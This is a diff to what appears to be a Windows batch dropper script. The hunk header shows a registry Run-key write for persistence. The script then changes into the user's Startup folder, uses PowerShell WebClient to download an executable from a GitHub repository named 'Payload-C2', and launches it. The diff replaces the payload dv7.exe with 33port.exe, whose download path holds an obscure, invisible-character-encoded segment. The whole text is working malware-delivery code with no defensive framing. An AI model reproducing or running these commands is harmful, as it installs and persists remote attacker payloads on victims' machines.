@@ -14,6 +14,6 @@ powershell.exe New-ItemProperty -Path HKLM:Software\Microsoft\Windows\CurrentVer
 
 cd "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 
-powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://github.com/DieFrikadelle/Payload-C2/raw/refs/heads/main/dv7.exe', '.\dv7.exe') }
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://github.com/DieFrikadelle/Payload-C2/raw/refs/heads/main/tester/saiko/saik0/kp%E2%81%ADgjiu/33port.exe', '.\33port.exe') }
 
-powershell -command "start dv7.exe" 
+powershell -command "start 33port.exe" 
